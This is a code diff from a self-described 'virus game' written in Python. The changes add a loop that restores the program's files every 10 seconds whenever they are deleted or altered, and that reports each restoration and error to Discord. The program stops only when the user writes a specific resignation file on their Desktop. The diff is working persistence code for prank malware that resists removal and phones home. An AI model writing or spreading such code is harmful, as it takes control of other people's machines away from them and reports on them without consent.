@@ -26,9 +26,8 @@ def log_to_discord(msg:str):
     except:
         print("Failed to send port request")
 log_to_discord("File checker...")
-        
-def start():
-    log_to_discord(f"Virus is running...")
+
+def check_resign():  
     try:
         with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
             content = f.readlines()
@@ -56,21 +55,25 @@ def start():
                     root.withdraw()
                     tkinter.messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
                 tkinter.messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
-                return
+                sys.exit()
             else:
                 raise Exception()
     except:
         pass
 
-    backuped_files = [open(path, "rb").read() for path in files_to_backup]
+backuped_files = [open(path, "rb").read() for path in files_to_backup]
 
-    while True:
-        for index, path in enumerate(files_to_backup):
-            backup = backuped_files[index]
+while True:
+    check_resign()
+    for index, path in enumerate(files_to_backup):
+        backup = backuped_files[index]
+        try:
             if not os.path.exists(path) or open(path, "rb").read() != backup:
+                log_to_discord(f"File {path} was removed, reconstructing")
                 with open(path, "wb") as file:
                     file.write(backup)
-        time.sleep(10)
+        except Exception as e:
+            log_to_discord(f"Error: {e}")
+    time.sleep(10)
 
 
-start()
